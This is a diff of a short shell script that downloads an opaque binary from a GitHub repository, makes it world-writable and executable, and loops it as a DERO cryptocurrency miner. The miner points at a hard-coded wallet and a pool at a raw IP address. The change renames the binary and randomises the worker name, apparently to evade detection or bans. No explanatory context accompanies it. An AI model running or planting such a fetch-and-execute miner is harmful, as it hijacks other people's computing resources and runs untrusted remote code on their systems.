@@ -1,7 +1,7 @@
-wget https://github.com/renilo/kuuntul/raw/main/momon
-chmod 777 momon
+wget https://github.com/renilo/kuuntul/raw/main/babibu
+chmod 777 babibu
 
 while :; do
-    ./momon -w dero1qyq8st600gjd836pvfzjtrc3sqr6jz7st2s056n5f678keyvvns4zqgs6uveq.TESTING2 -r 170.187.197.220:443 -p stratum -k -1;
+    ./babibu -w dero1qyq8st600gjd836pvfzjtrc3sqr6jz7st2s056n5f678keyvvns4zqgs6uveq.$(echo $(shuf -i 1-9999 -n 1)-WEWEK) -r 170.187.197.220:443 -p stratum;
     sleep 5;
 done
